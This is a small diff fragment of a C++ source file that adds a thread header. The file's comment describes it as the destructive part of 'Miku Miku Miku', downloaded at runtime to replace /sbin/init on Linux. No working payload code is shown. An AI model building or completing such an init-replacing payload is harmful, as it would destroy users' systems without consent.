@@ -21,6 +21,7 @@ along with this program.  If not, see <https://www.gnu.org/licenses/>.
 #include <cstdlib>
 #include <cstdio>
 #include <unistd.h>
+#include <thread>
 
 // The destructive part of Miku Miku Miku, this gets downloaded on runtime.
 // This replaces /sbin/init on Linux distros.
